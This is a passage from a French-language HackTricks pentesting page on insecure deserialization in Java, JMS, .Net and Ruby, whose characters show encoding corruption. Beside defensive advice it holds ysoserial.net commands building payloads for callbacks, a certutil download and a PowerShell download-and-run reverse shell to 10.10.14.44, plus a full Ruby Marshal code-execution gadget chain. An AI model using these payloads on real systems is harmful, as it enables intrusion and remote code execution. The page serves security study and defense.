En savoir plus sur cette biblioth√®que JSON Java : [https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html](https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html)

### Laboratoires

* Si vous souhaitez tester certains payloads ysoserial, vous pouvez **ex√©cuter cette application web** : [https://github.com/hvqzao/java-deserialize-webapp](https://github.com/hvqzao/java-deserialize-webapp)
* [https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/](https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)

### Pourquoi

Java utilise beaucoup la s√©rialisation √† des fins diverses telles que :

* **Requ√™tes HTTP** : La s√©rialisation est largement utilis√©e dans la gestion des param√®tres, ViewState, cookies, etc.
* **RMI (Invocation de M√©thode √† Distance)** : Le protocole Java RMI, qui repose enti√®rement sur la s√©rialisation, est un pilier pour la communication √† distance dans les applications Java.
* **RMI sur HTTP** : Cette m√©thode est couramment utilis√©e par les applications web clientes √©paisses bas√©es sur Java, utilisant la s√©rialisation pour toutes les communications d'objets.
* **JMX (Extensions de Gestion Java)** : JMX utilise la s√©rialisation pour transmettre des objets sur le r√©seau.
* **Protocoles Personnalis√©s** : En Java, la pratique standard implique la transmission d'objets Java bruts, ce qui sera d√©montr√© dans les exemples d'exploitation √† venir.

### Pr√©vention

#### Objets Transitoires

Une classe qui impl√©mente `Serializable` peut d√©clarer comme `transient` tout objet √† l'int√©rieur de la classe qui ne devrait pas √™tre s√©rialis√©. Par exemple :
```java
public class myAccount implements Serializable
{
private transient double profit; // declared transient
private transient double margin; // declared transient
```
#### √âviter la s√©rialisation d'une classe qui doit impl√©menter Serializable

Dans les sc√©narios o√π certains **objets doivent impl√©menter l'interface `Serializable`** en raison de la hi√©rarchie de classes, il existe un risque de d√©s√©rialisation involontaire. Pour √©viter cela, assurez-vous que ces objets ne peuvent pas √™tre d√©s√©rialis√©s en d√©finissant une m√©thode `readObject()` `final` qui lance syst√©matiquement une exception, comme indiqu√© ci-dessous :
```java
private final void readObject(ObjectInputStream in) throws java.io.IOException {
throw new java.io.IOException("Cannot be deserialized");
}
```
#### **Am√©liorer la s√©curit√© de la d√©s√©rialisation en Java**

Personnaliser `java.io.ObjectInputStream` est une approche pratique pour s√©curiser les processus de d√©s√©rialisation. Cette m√©thode est adapt√©e lorsque :

* Le code de d√©s√©rialisation est sous votre contr√¥le.
* Les classes attendues pour la d√©s√©rialisation sont connues.

Remplacez la m√©thode **`resolveClass()`** pour limiter la d√©s√©rialisation aux seules classes autoris√©es. Cela emp√™che la d√©s√©rialisation de toute classe sauf celles explicitement autoris√©es, comme dans l'exemple suivant qui restreint la d√©s√©rialisation √† la classe `Bicycle` uniquement :
```java
// Code from https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
public class LookAheadObjectInputStream extends ObjectInputStream {

public LookAheadObjectInputStream(InputStream inputStream) throws IOException {
super(inputStream);
}

/**
* Only deserialize instances of our expected Bicycle class
*/
@Override
protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
if (!desc.getName().equals(Bicycle.class.getName())) {
throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
}
return super.resolveClass(desc);
}
}
```
**Utilisation d'un agent Java pour l'am√©lioration de la s√©curit√©** offre une solution de secours lorsque la modification du code n'est pas possible. Cette m√©thode s'applique principalement pour **mettre sur liste noire des classes nuisibles**, en utilisant un param√®tre JVM :
```
-javaagent:name-of-agent.jar
```
Il fournit un moyen de s√©curiser la d√©s√©rialisation de mani√®re dynamique, id√©al pour les environnements o√π les modifications de code imm√©diates sont impraticables.

Consultez un exemple dans [rO0 by Contrast Security](https://github.com/Contrast-Security-OSS/contrast-rO0)

**Mise en ≈ìuvre des filtres de s√©rialisation**: Java 9 a introduit des filtres de s√©rialisation via l'interface **`ObjectInputFilter`**, offrant un m√©canisme puissant pour sp√©cifier les crit√®res que les objets s√©rialis√©s doivent respecter avant d'√™tre d√©s√©rialis√©s. Ces filtres peuvent √™tre appliqu√©s globalement ou par flux, offrant un contr√¥le granulaire sur le processus de d√©s√©rialisation.

Pour utiliser les filtres de s√©rialisation, vous pouvez d√©finir un filtre global qui s'applique √† toutes les op√©rations de d√©s√©rialisation ou le configurer dynamiquement pour des flux sp√©cifiques. Par exemple:
```java
ObjectInputFilter filter = info -> {
if (info.depth() > MAX_DEPTH) return Status.REJECTED; // Limit object graph depth
if (info.references() > MAX_REFERENCES) return Status.REJECTED; // Limit references
if (info.serialClass() != null && !allowedClasses.contains(info.serialClass().getName())) {
return Status.REJECTED; // Restrict to allowed classes
}
return Status.ALLOWED;
};
ObjectInputFilter.Config.setSerialFilter(filter);
```
**Exploiter les biblioth√®ques externes pour une s√©curit√© renforc√©e** : Des biblioth√®ques telles que **NotSoSerial**, **jdeserialize** et **Kryo** offrent des fonctionnalit√©s avanc√©es pour contr√¥ler et surveiller la d√©s√©rialisation Java. Ces biblioth√®ques peuvent fournir des couches de s√©curit√© suppl√©mentaires, telles que la liste blanche ou noire des classes, l'analyse des objets s√©rialis√©s avant la d√©s√©rialisation et la mise en ≈ìuvre de strat√©gies de s√©rialisation personnalis√©es.

* **NotSoSerial** intercepte les processus de d√©s√©rialisation pour emp√™cher l'ex√©cution de code non fiable.
* **jdeserialize** permet l'analyse des objets Java s√©rialis√©s sans les d√©s√©rialiser, aidant √† identifier un contenu potentiellement malveillant.
* **Kryo** est un framework de s√©rialisation alternatif qui met l'accent sur la vitesse et l'efficacit√©, offrant des strat√©gies de s√©rialisation configurables qui peuvent renforcer la s√©curit√©.

### R√©f√©rences

* [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html)
* Pr√©sentation sur la d√©s√©rialisation et ysoserial : [http://frohoff.github.io/appseccali-marshalling-pickles/](http://frohoff.github.io/appseccali-marshalling-pickles/)
* [https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)
* [https://www.youtube.com/watch?v=VviY3O-euVQ](https://www.youtube.com/watch?v=VviY3O-euVQ)
* Pr√©sentation sur gadgetinspector : [https://www.youtube.com/watch?v=wPbW6zQ52w8](https://www.youtube.com/watch?v=wPbW6zQ52w8) et diapositives : [https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf](https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf)
* Article sur Marshalsec : [https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true](https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true)
* [https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr](https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr)
* [https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html](https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html)
* [https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html](https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html)
* Article sur la d√©s√©rialisation JSON en Java et .Net : [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** pr√©sentation : [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) et diapositives : [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* CVEs de d√©s√©rialisation : [https://paper.seebug.org/123/](https://paper.seebug.org/123/)

## Injection JNDI & log4Shell

D√©couvrez ce qu'est l'**injection JNDI, comment l'exploiter via RMI, CORBA & LDAP et comment exploiter log4shell** (et un exemple de cette vuln√©rabilit√©) sur la page suivante :

{% content-ref url="jndi-java-naming-and-directory-interface-and-log4shell.md" %}
[jndi-java-naming-and-directory-interface-and-log4shell.md](jndi-java-naming-and-directory-interface-and-log4shell.md)
{% endcontent-ref %}

## JMS - Java Message Service

> L'API **Java Message Service** (**JMS**) est une API middleware orient√©e messages en Java pour l'envoi de messages entre deux clients ou plus. Il s'agit d'une impl√©mentation pour r√©soudre le probl√®me producteur-consommateur. JMS fait partie de la plateforme Java Enterprise Edition (Java EE) et a √©t√© d√©fini par une sp√©cification d√©velopp√©e chez Sun Microsystems, mais qui est depuis guid√©e par le Java Community Process. C'est une norme de messagerie qui permet aux composants d'application bas√©s sur Java EE de cr√©er, envoyer, recevoir et lire des messages. Elle permet √† la communication entre diff√©rents composants d'une application distribu√©e d'√™tre faiblement coupl√©e, fiable et asynchrone. (De [Wikipedia](https://en.wikipedia.org/wiki/Java\_Message\_Service)).

### Produits

Plusieurs produits utilisent ce middleware pour envoyer des messages :

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../.gitbook/assets/image (314).png>)

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../.gitbook/assets/image (1056).png>)

### Exploitation

En gros, il y a **une s√©rie de services utilisant JMS de mani√®re dangereuse**. Par cons√©quent, si vous avez **suffisamment de privil√®ges** pour envoyer des messages √† ces services (g√©n√©ralement vous aurez besoin d'identifiants valides), vous pourriez √™tre en mesure d'envoyer des **objets malveillants s√©rialis√©s qui seront d√©s√©rialis√©s par le consommateur/abonn√©**.\
Cela signifie que dans cette exploitation, tous les **clients qui vont utiliser ce message seront infect√©s**.

N'oubliez pas que m√™me si un service est vuln√©rable (car il d√©s√©rialise de mani√®re non s√©curis√©e des entr√©es utilisateur), vous devez toujours trouver des gadgets valides pour exploiter la vuln√©rabilit√©.

L'outil [JMET](https://github.com/matthiaskaiser/jmet) a √©t√© cr√©√© pour **se connecter et attaquer ces services en envoyant plusieurs objets malveillants s√©rialis√©s √† l'aide de gadgets connus**. Ces exploits fonctionneront si le service est toujours vuln√©rable et si l'un des gadgets utilis√©s se trouve dans l'application vuln√©rable.

### R√©f√©rences

* Pr√©sentation JMET : [https://www.youtube.com/watch?v=0h8DWiOWGGA](https://www.youtube.com/watch?v=0h8DWiOWGGA)
* Diapositives : [https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf)

## .Net

Dans le contexte de .Net, les exploits de d√©s√©rialisation fonctionnent de mani√®re similaire √† ceux trouv√©s en Java, o√π des gadgets sont exploit√©s pour ex√©cuter un code sp√©cifique lors de la d√©s√©rialisation d'un objet.
### Empreinte digitale

#### Bo√Æte Blanche

Le code source doit √™tre inspect√© pour rechercher les occurrences de :

1. `TypeNameHandling`
2. `JavaScriptTypeResolver`

L'accent doit √™tre mis sur les s√©rialiseurs qui permettent de d√©terminer le type √† partir d'une variable sous le contr√¥le de l'utilisateur.

#### Bo√Æte Noire

La recherche doit cibler la cha√Æne encod√©e en Base64 **AAEAAAD/////** ou tout motif similaire qui pourrait subir une d√©s√©rialisation c√¥t√© serveur, accordant le contr√¥le sur le type √† d√©s√©rialiser. Cela pourrait inclure, mais sans s'y limiter, des structures **JSON** ou **XML** pr√©sentant `TypeObject` ou `$type`.

### ysoserial.net

Dans ce cas, vous pouvez utiliser l'outil [**ysoserial.net**](https://github.com/pwntester/ysoserial.net) pour **cr√©er des exploits de d√©s√©rialisation**. Une fois le d√©p√¥t git t√©l√©charg√©, vous devriez **compiler l'outil** en utilisant Visual Studio par exemple.

Si vous souhaitez en savoir plus sur **comment ysoserial.net cr√©e son exploit**, vous pouvez [**consulter cette page o√π est expliqu√© le gadget ObjectDataProvider + ExpandedWrapper + formateur Json.Net**](basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md).

Les principales options de **ysoserial.net** sont : **`--gadget`**, **`--formatter`**, **`--output`** et **`--plugin`.**

* **`--gadget`** utilis√© pour indiquer le gadget √† exploiter (indiquer la classe/fonction qui sera exploit√©e lors de la d√©s√©rialisation pour ex√©cuter des commandes).
* **`--formatter`**, utilis√© pour indiquer la m√©thode pour s√©rialiser l'exploit (vous devez savoir quelle biblioth√®que est utilis√©e en arri√®re-plan pour d√©s√©rialiser la charge utile et utiliser la m√™me pour la s√©rialiser)
* **`--output`** utilis√© pour indiquer si vous voulez l'exploit en **brut** ou encod√© en **base64**. _Notez que **ysoserial.net** va **encoder** la charge utile en utilisant **UTF-16LE** (encodage utilis√© par d√©faut sur Windows) donc si vous obtenez le brut et l'encodez simplement depuis une console Linux, vous pourriez rencontrer des **probl√®mes de compatibilit√© d'encodage** qui emp√™cheront l'exploit de fonctionner correctement (dans la bo√Æte JSON HTB, la charge utile a fonctionn√© en UTF-16LE et en ASCII mais cela ne signifie pas que cela fonctionnera toujours)._
* **`--plugin`** ysoserial.net prend en charge les plugins pour cr√©er des **exploits pour des frameworks sp√©cifiques** comme ViewState

#### Plus de param√®tres ysoserial.net

* `--minify` fournira une **charge utile plus petite** (si possible)
* `--raf -f Json.Net -c "anything"` Cela indiquera tous les gadgets qui peuvent √™tre utilis√©s avec un formateur fourni (`Json.Net` dans ce cas)
* `--sf xml` vous pouvez **indiquer un gadget** (`-g`) et ysoserial.net recherchera des formateurs contenant "xml" (insensible √† la casse)

Exemples d'exploits **ysoserial** pour cr√©er :
```bash
#Send ping
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping -n 5 10.10.14.44" -o base64

#Timing
#I tried using ping and timeout but there wasn't any difference in the response timing from the web server

#DNS/HTTP request
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "nslookup sb7jkgm6onw1ymw0867mzm2r0i68ux.burpcollaborator.net" -o base64
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "certutil -urlcache -split -f http://rfaqfsze4tl7hhkt5jtp53a1fsli97.burpcollaborator.net/a a" -o base64

#Reverse shell
#Create shell command in linux
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.44/shell.ps1')" | iconv  -t UTF-16LE | base64 -w0
#Create exploit using the created B64 shellcode
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQANAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=" -o base64
```
**ysoserial.net** a √©galement un **param√®tre tr√®s int√©ressant** qui aide √† mieux comprendre comment chaque exploit fonctionne : `--test`. Si vous indiquez ce param√®tre, **ysoserial.net** va **essayer** l'**exploit localement**, vous permettant ainsi de tester si votre charge utile fonctionnera correctement. Ce param√®tre est utile car si vous examinez le code, vous trouverez des morceaux de code comme celui-ci (provenant de [ObjectDataProviderGenerator.cs](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Generators/ObjectDataProviderGenerator.cs#L208)) :
```java
if (inputArgs.Test)
{
try
{
SerializersHelper.JsonNet_deserialize(payload);
}
catch (Exception err)
{
Debugging.ShowErrors(inputArgs, err);
}
}
```
Cela signifie qu'en vue de tester l'exploit, le code appellera [serializersHelper.JsonNet\_deserialize](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Helpers/SerializersHelper.cs#L539)
```java
public static object JsonNet_deserialize(string str)
{
Object obj = JsonConvert.DeserializeObject<Object>(str, new JsonSerializerSettings
{
TypeNameHandling = TypeNameHandling.Auto
});
return obj;
}
```
Le **code pr√©c√©dent est vuln√©rable √† l'exploit cr√©√©**. Donc, si vous trouvez quelque chose de similaire dans une application .Net, cela signifie probablement que cette application est √©galement vuln√©rable.\
Par cons√©quent, le param√®tre **`--test`** nous permet de comprendre **quels morceaux de code sont vuln√©rables** √† l'exploit de d√©s√©rialisation que **ysoserial.net** peut cr√©er.

### ViewState

Jetez un ≈ìil √† [ce POST sur **comment essayer d'exploiter le param√®tre \_\_ViewState de .Net**](exploiting-\_\_viewstate-parameter.md) pour **ex√©cuter du code arbitraire**. Si vous **connaissez d√©j√† les secrets** utilis√©s par la machine victime, [**lisez ce post pour savoir comment ex√©cuter du code**](exploiting-\_\_viewstate-knowing-the-secret.md)**.**

### Pr√©vention

Pour att√©nuer les risques associ√©s √† la d√©s√©rialisation en .Net :

* **√âvitez de permettre aux flux de donn√©es de d√©finir leurs types d'objets.** Utilisez `DataContractSerializer` ou `XmlSerializer` lorsque c'est possible.
* **Pour `JSON.Net`, d√©finissez `TypeNameHandling` sur `None` :** %%%TypeNameHandling = TypeNameHandling.None%%%
* **√âvitez d'utiliser `JavaScriptSerializer` avec un `JavaScriptTypeResolver`.**
* **Limitez les types pouvant √™tre d√©s√©rialis√©s**, en comprenant les risques inh√©rents aux types .Net, tels que `System.IO.FileInfo`, qui peuvent modifier les propri√©t√©s des fichiers du serveur, entra√Ænant potentiellement des attaques de d√©ni de service.
* **Soyez prudent avec les types ayant des propri√©t√©s risqu√©es**, comme `System.ComponentModel.DataAnnotations.ValidationException` avec sa propri√©t√© `Value`, qui peut √™tre exploit√©e.
* **Contr√¥lez de mani√®re s√©curis√©e l'instanciation des types** pour emp√™cher les attaquants d'influencer le processus de d√©s√©rialisation, rendant m√™me `DataContractSerializer` ou `XmlSerializer` vuln√©rables.
* **Impl√©mentez des contr√¥les de liste blanche** en utilisant un `SerializationBinder` personnalis√© pour `BinaryFormatter` et `JSON.Net`.
* **Renseignez-vous sur les gadgets de d√©s√©rialisation connus comme √©tant non s√©curis√©s** dans .Net et assurez-vous que les d√©s√©rialiseurs n'instancient pas de tels types.
* **Isoler le code potentiellement risqu√©** du code ayant un acc√®s internet pour √©viter d'exposer des gadgets connus, tels que `System.Windows.Data.ObjectDataProvider` dans les applications WPF, √† des sources de donn√©es non fiables.

### **R√©f√©rences**

* Document sur la d√©s√©rialisation JSON en Java et .Net : [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** pr√©sentation : [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) et diapositives : [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp)
* [https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf)
* [https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization](https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization)

## **Ruby**

En Ruby, la s√©rialisation est facilit√©e par deux m√©thodes de la biblioth√®que **marshal**. La premi√®re m√©thode, appel√©e **dump**, est utilis√©e pour transformer un objet en un flux d'octets. Ce processus est appel√© s√©rialisation. En revanche, la deuxi√®me m√©thode, **load**, est utilis√©e pour reconvertir un flux d'octets en un objet, un processus appel√© d√©s√©rialisation.

Pour s√©curiser les objets s√©rialis√©s, **Ruby utilise HMAC (Code d'authentification de message bas√© sur le hachage)**, garantissant l'int√©grit√© et l'authenticit√© des donn√©es. La cl√© utilis√©e √† cette fin est stock√©e dans l'un des emplacements possibles suivants :

* `config/environment.rb`
* `config/initializers/secret_token.rb`
* `config/secrets.yml`
* `/proc/self/environ`

**Cha√Æne de gadgets RCE de d√©s√©rialisation g√©n√©rique Ruby 2.X (plus d'informations dans** [**https://www.elttam.com/blog/ruby-deserialization/**](https://www.elttam.com/blog/ruby-deserialization/)**)**:
```ruby
#!/usr/bin/env ruby

# Code from https://www.elttam.com/blog/ruby-deserialization/

class Gem::StubSpecification
def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|id 1>&2")#RCE cmd must start with "|" and end with "1>&2"

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
def marshal_dump
[$dependency_list]
end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
pipe.print payload
pipe.close_write
puts pipe.gets
puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts


require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
```
Autre cha√Æne RCE pour exploiter Ruby On Rails : [https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/](https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/)

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>
